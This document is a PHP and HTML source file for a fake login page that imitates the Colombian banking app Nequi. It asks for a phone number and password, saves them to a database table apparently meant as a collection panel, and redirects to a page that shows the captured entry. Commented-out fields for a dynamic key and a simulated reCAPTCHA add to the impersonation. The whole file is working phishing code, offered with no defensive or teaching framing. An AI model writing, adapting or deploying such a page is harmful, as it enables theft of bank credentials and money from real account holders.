<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta charset="UTF-8">
  <title>Entra</title>
  <style>
    /* RESET BÁSICO */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #fde7f4; /* Fondo rosado claro */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    /* CONTENEDOR PRINCIPAL */
    .container {
      background-color: #fff; 
      width: 360px;
      padding: 2rem 1.5rem;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
      position: relative;
    }

    /* TÍTULO Y SUBTÍTULO */
    .container h1 {
      font-size: 1.5rem;
      color: #333;
      margin-bottom: 0.5rem;
    }

    .container p {
      font-size: 0.95rem;
      color: #666;
      margin-bottom: 1.5rem;
    }

    /* FORMULARIO */
    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .input-group {
      text-align: left;
    }

    label {
      display: block;
      font-size: 0.85rem;
      margin-bottom: 0.3rem;
      color: #333;
    }

    .country-phone {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .country-phone select {
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 0.9rem;
      background-color: #fff;
      width: 80px;
    }

    .country-phone input {
      flex: 1;
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 0.9rem;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 0.9rem;
    }

    /* RECAPTCHA */
    .recaptcha-container {
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 0.5rem;
      text-align: left;
      font-size: 0.9rem;
      color: #333;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .recaptcha-container input[type="checkbox"] {
      transform: scale(1.2);
      cursor: pointer;
    }

    .recaptcha-text {
      display: flex;
      flex-direction: column;
    }

    .recaptcha-text span {
      margin-bottom: 0.2rem;
    }

    .recaptcha-links {
      font-size: 0.75rem;
      color: #777;
    }

    .recaptcha-links a {
      color: #777;
      text-decoration: none;
      margin: 0 0.3rem;
    }

    /* BOTÓN */
    button {
      background-color: #ff0080; /* Botón rosado fuerte */
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 0.8rem;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 0.5rem;
    }

    button:hover {
      background-color: #e60073; /* Efecto hover */
    }

    /* DECORACIÓN FONDO (OPCIONAL) */
    /* Ejemplo de cuadrados rosas en el fondo */
    .bg-square {
      position: absolute;
      width: 100px;
      height: 100px;
      background-color: #fbcfee;
      border-radius: 8px;
      z-index: -1; /* Para que aparezca detrás del contenedor */
    }

    .square1 {
      top: -40px;
      right: -30px;
    }

    .square2 {
      bottom: -40px;
      right: 30px;
    }

  </style>
</head>
<body>
  <div class="container">
    <!-- Elementos decorativos de fondo (opcional) -->
    <div class="bg-square square1"></div>
    <div class="bg-square square2"></div>


    <h1>Entra a tu Nequi</h1>
    <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
    <form action="#" method="post">
      <!-- Número de celular -->
      <div class="input-group">
        <label for="phone">Número de celular</label>
        <div class="country-phone">
          <!-- Puedes reemplazar esto con una imagen de la bandera si lo deseas -->
          <select name="country-code" id="country-code">
            <option value="+57">+57</option>
            <!-- Otras opciones si lo deseas -->
          </select>
          <input type="text" id="username" name="dato1" placeholder="Número de celular" required>
          </div>
      </div>

      <!-- Contraseña -->
      <div class="input-group">
        <label for="password">Contraseña</label>
        <input type="password" id="password" name="dato2" placeholder="Contraseña"    required>
        </div>

      <!-- Clave dinámica
      <div class="input-group">
        <label for="clave">Clave dinámica</label>
        <input type="text" id="clave" name="clave" placeholder="Clave dinámica">
      </div> -->

      <!-- Recaptcha (simulado)
      <div class="recaptcha-container">
        <input type="checkbox" id="recaptcha">
        <div class="recaptcha-text">
          <span><strong>No soy un robot</strong></span>
          <span class="recaptcha-links">
            Este sitio está protegido por reCAPTCHA. 
            <a href="#">Privacidad</a> - 
            <a href="#">Términos</a>
          </span>
        </div>
      </div> -->

      <!-- Botón Entrar -->
      <button id="submitBtn" class="login-button">INGRESAR</button>
      >
    </form>
  </div>
</body>
</html>

    
        
